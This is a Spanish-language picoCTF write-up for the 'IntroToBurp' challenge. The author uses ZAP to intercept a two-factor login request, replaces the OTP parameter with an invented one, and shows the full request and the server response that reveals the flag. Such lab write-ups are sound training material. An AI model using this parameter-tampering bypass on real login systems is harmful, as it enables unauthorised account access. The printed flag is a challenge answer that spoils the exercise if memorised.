---
title: IntroToBurp
date: 2025-04-14 22:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, introburp, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>IntroToBurp
Author: Nana Ama Atombo-Sackey & Sabine Gisagara
Description
Try here to find the flag
{: .prompt-tip }

Para este reto nos muestran una web con un formulario, nos dan una pista con el propio nombre del reto "IntroToBurp"
Bueno yo sigo pensando que Zap me sirve y además es gratis así que capturo con Zap la request y observo.
Después del primer envío nos envía a otra web donde nos pide un código OPT.

2fa authentication

Hay una pista que nos indica como debemos proceder:
"Intente alterar la solicitud; tal vez su código del lado del servidor no maneja muy bien las solicitudes malformadas."
cambio el parámetro OPT otp=6 por uno inventado. 
```
POST http://titan.picoctf.net:61730/dashboard HTTP/1.1
host: titan.picoctf.net:61730
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
content-length: 9
Origin: http://titan.picoctf.net:61730
Connection: keep-alive
Referer: http://titan.picoctf.net:61730/dashboard
Cookie: session=.eJxFjMEOwiAQRP-FswdhoS3-DCnb3WhsgSwQY4z_LhfT47yZeR-Fj_ZWNxW7FHVRWIVDy09KgxnvGVenpxgnxxw1snUM3qO5otYIC9AGix0_7vse0nrQqcqtjOCsnmcYsay1vrJs56Dcc6KQ-hFJBgVrwIIZRa8kf5f0or4_jV0yvQ.Z_2f7g.f3xqPKskvt-OIhIapOBzVYjdj1Y
Upgrade-Insecure-Requests: 1
Priority: u=0, i

test=aqaa
```
```
Welcome, brup you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}
```

flag: **picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}**

Supuestamente el provocar un error o introducir un dato distinto al deseado provoca el bypass del OPT. 
Como habrás notado Zap me ha servido tanto para capturar la solicitud como para modificarla. 